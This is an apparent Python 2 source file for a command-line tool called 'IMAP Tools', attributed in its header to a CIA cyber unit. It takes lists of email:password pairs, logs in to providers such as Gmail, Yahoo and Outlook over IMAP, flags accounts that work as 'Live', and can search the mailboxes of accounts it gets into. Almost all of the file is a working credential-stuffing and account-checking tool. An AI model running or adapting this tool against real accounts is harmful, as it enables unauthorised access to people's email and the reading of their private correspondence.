#!/usr/bin/python
# coding: utf-8

import argparse
import sys
import os
import imaplib
import re
import subprocess
from validate_email import validate_email

__author__ = "Center For Cyber Intelligence - Central Intelligence Agency"
__version__ = "1.0"
__description__ = "IMAP Tools E-mails"

__banner__ = """
 ██▓ ███▄ ▄███▓ ▄▄▄       ██▓███     ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
▓██▒▓██▒▀█▀ ██▒▒████▄    ▓██░  ██▒   ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
▒██▒▓██    ▓██░▒██  ▀█▄  ▓██░ ██▓▒   ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
░██░▒██    ▒██ ░██▄▄▄▄██ ▒██▄█▓▒ ▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
░██░▒██▒   ░██▒ ▓█   ▓██▒▒██▒ ░  ░     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
░▓  ░ ▒░   ░  ░ ▒▒   ▓▒█░▒▓▒░ ░  ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
 ▒ ░░  ░      ░  ▒   ▒▒ ░░▒ ░            ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
 ▒ ░░      ░     ░   ▒   ░░            ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
 ░         ░         ░  ░                         ░ ░      ░ ░      ░  ░      ░  
---------------------------------------------------------------------------------
"""

CRED = '\033[91m'
CGREEN = '\033[92m'
CYELLOW = '\033[93m'
CBLUE = '\033[94m'
CMAGENTA = '\033[95m'
CGREY = '\033[90m'
CBLAC = '\033[90m'
CEND = '\033[0m'

BLOCK_SIZE = 16


imap_config = {
	'@gmail' : 'imap.gmail.com',
	'@yahoo' : 'imap.mail.yahoo.com',
	'@live' : 'imap-mail.outlook.com',
	'@hotmail' : 'imap-mail.outlook.com',
	'@office365' : 'outlook.office365.com',
	'@marriott' : 'mail.marriott.com',
	'@bt' : 'imap.btinternet.com',
}


__version = '%s[+]%s %s - Version: %s' %(CGREEN, CEND, __description__, __version__) 

def get_args():
	parser = argparse.ArgumentParser(description=__description__)
	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('-e', '--email', dest='email', help='Teste email:password for test imap')
	group.add_argument('-i', '--input', dest='input', help='Input file with email:password for test imap.', type=argparse.FileType('r'))
	group.add_argument('-t', '--test', dest='test', help='Test email valid.')
	group.add_argument('-f', '--file', dest='file', help='Input file with email or email:password for test email.', type=argparse.FileType('r'))
	parser.add_argument('-s', '--search', dest='search', help='Search in email ex: \'FROM "test@mail.com"\'')
	parser.add_argument('-o', '--output', dest='output', help='Output file log.', type=argparse.FileType('w'))
	parser.add_argument('-b', '--beep', dest='beep', help='Beep alert when raw is live.', action='store_true')
	parser.add_argument('-d', '--debug', dest='debug', help='This argument allows debugging information.', action='store_true')
	parser.add_argument('-v', '--version', dest='version', help='This argument show version.', action='version', version=__version)

	if len(sys.argv) == 1:  # If no arguments were provided, then print help and exit.
		parser.print_help()
		sys.exit(1)

	return parser.parse_args()

def imapTest(num, raw):
	if _args.debug: print '%s[!]%s Num: %s - Raw: %s' %(CYELLOW, CEND, num, raw)
	if _args.output: file_write.write('[!] Num: %s - Raw: %s\n' %(num, raw))

	arr_raw = raw.split(':')

	if len(arr_raw) == 1:
		if _args.debug: print '%s[!]%s Fail split - raw: %s' %(CYELLOW, CEND, raw)
		if _args.output: file_write.write('[!] Fail split - raw: %s\n' %raw)
		arr_raw[0] = raw

	try:
		is_valid = validate_email(arr_raw[0],verify=True)

		if is_valid:
			print '%s[+]%s Email valid: %s' %(CGREEN, CEND, raw)
			if _args.output: file_write.write('[+] Email valid: %s\n' %raw)
		else:
			print '%s[-]%s Email not valid: %s' %(CRED, CEND, raw)
			if _args.output: file_write.write('[-] Email not valid: %s\n' %raw)
	except:
		if _args.debug: print '%s[-]%s Unexpected error: %s' %(CRED, CEND, sys.exc_info())
		if _args.output: file_write.write('[-] Unexpected error: %s | %s | %s' %(sys.exc_info()[0],sys.exc_info()[1],sys.exc_info()[2]))

def imapTools(num, raw):

	if _args.debug: print '%s[!]%s Num: %s - Raw: %s' %(CYELLOW, CEND, num, raw)
	if _args.output: file_write.write('[!] Num: %s - Raw: %s\n' %(num, raw))
		
	arr_raw = raw.split(':')

	if len(arr_raw) == 1:
		if _args.debug: print '%s[!]%s Fail split' %(CYELLOW, CEND)
		if _args.output: file_write.write('[!] Fail split\n')
		return

	try:
		imap = re.search("@[\w]+", arr_raw[0])
		imap = imap.group()
	except:
		if _args.debug: print '%s[!]%s IMAP config not found: %s' %(CYELLOW, CEND, arr_raw[0])
		if _args.output: file_write.write('[!] IMAP config not found: %s\n' %arr_raw[0])
	
	try:
		config = imap_config[imap]
	except:	
		if _args.debug: print '%s[!]%s IMAP config not found: %s' %(CYELLOW, CEND, raw)
		if _args.output: file_write.write('[!] IMAP config not found: %s\n' %raw)
		try:
			imap = re.search("@[\w.]+", arr_raw[0])
			config = 'imap.' + imap.group().replace("@","")
		except:
			if _args.debug: print '%s[!]%s Invalid raw: %s' %(CRED, CEND, raw)
			if _args.output: file_write.write('[!] Invalid raw: %s\n' %raw)
			return

	try:
		if _args.debug: print '%s[*]%s IMAP config: %s' %(CBLUE, CEND, config)
		if _args.output: file_write.write('[!] IMAP config: %s\n' %config)

		mail = imaplib.IMAP4_SSL(config, 993)
		mail.login(arr_raw[0],arr_raw[1])
		print "%s[+]%s %s - Live" %(CGREEN, CEND, raw)

		if _args.output: file_write.write('[+] %s - Live\n' %raw)

		if _args.beep:
			text = '"mail found"'
			subprocess.call('echo '+text+'|festival --tts', shell=True)

		if _args.search:
			try:
				mail.list()
				mail.select()
				result, data = 	mail.uid('search', None, '('+_args.search+')')

				if not data[0]:
					print "%s[-]%s %s - Search not found" %(CRED, CEND, raw)
					if _args.output: file_write.write('[-] %s - Search not found\n' %raw)
				else:
					print "%s[+]%s %s - Search found" %(CGREEN, CEND, raw)
					if _args.output: file_write.write('[+] %s - Search catcher\n' %raw)
					if _args.beep:
						text = '"search found"'
						subprocess.call('echo '+text+'|festival --tts', shell=True)
			except:
				print '%s[-]%s %s - Search fail - %s' %(CRED, CEND, raw, sys.exc_info()[1])
				if _args.output: file_write.write('[-] %s - Search fail - %s\n' %(raw, sys.exc_info()[1]))

				if _args.debug: print '%s[!]%s Unexpected error: %s' %(CYELLOW, CEND, sys.exc_info())
				if _args.output: file_write.write('[!] Unexpected error: %s | %s | %s' %(sys.exc_info()[0],sys.exc_info()[1],sys.exc_info()[2]))
	except:
		print '%s[-]%s %s - Dead - %s' %(CRED, CEND, raw, sys.exc_info()[1])
		if _args.output: file_write.write('[-] %s - Dead - %s\n' %(raw, sys.exc_info()[1]))
		
		if _args.debug: print '%s[!]%s Unexpected error: %s' %(CYELLOW, CEND, sys.exc_info())
		if _args.output: file_write.write('[!] Unexpected error: %s | %s | %s' %(sys.exc_info()[0],sys.exc_info()[1],sys.exc_info()[2]))
		return

def main():
	os.system('clear')

	print __banner__
	
	global _args, file_write

	_args = get_args()
	email_list = []
	
	if _args.debug:
		print "%s[!]%s Mode Debug On" %(CYELLOW, CEND) 

	if _args.output:	
		file_write = open(_args.output.name, 'w')
		print "%s[*]%s File output: %s" %(CBLUE, CEND, _args.output.name) 
		if _args.output: file_write.write('[*] File output: %s\n' %_args.output.name)

	if _args.email:
		imapTools(1, _args.email)
	elif _args.test:
		imapTest(1, _args.test)
	elif _args.file:
		lines = sum(1 for line in open(_args.file.name))
		print "%s[*]%s File input: %s" %(CBLUE, CEND, _args.file.name)
		print "%s[*]%s Lines: %s"  %(CBLUE, CEND, str(lines))

		if _args.output: 
			file_write.write('[*] File input: %s\n' %_args.file.name)
			file_write.write('[*] File output: %s\n' %str(lines))
		
		try:
			for num, line in enumerate(_args.file, 1):
				imapTest(num, line.strip())
		except KeyboardInterrupt:
			print "%s[!]%s Keyboard Interrupt..." %(CYELLOW, CEND)
			if _args.output:	
				file_write.close()
			sys.exit()		
	else:
		lines = sum(1 for line in open(_args.input.name))
		print "%s[*]%s File input: %s" %(CBLUE, CEND, _args.input.name)
		print "%s[*]%s Lines: %s"  %(CBLUE, CEND, str(lines))
		if _args.search: print "%s[*]%s Search: %s"  %(CBLUE, CEND, _args.search)

		if _args.output: 
			file_write.write('[*] File input: %s\n' %_args.input.name)
			file_write.write('[*] File output: %s\n' %str(lines))
			if _args.search: file_write.write('[*] Search: %s'  %_args.search)
		
		try:
			for num, line in enumerate(_args.input, 1):
				imapTools(num, line.strip())
		except KeyboardInterrupt:
			print "%s[!]%s Keyboard Interrupt..." %(CYELLOW, CEND)
			if _args.output:	
				file_write.close()
			sys.exit()		

	if _args.output:	
		file_write.close()

if __name__ == '__main__':
	main()
  
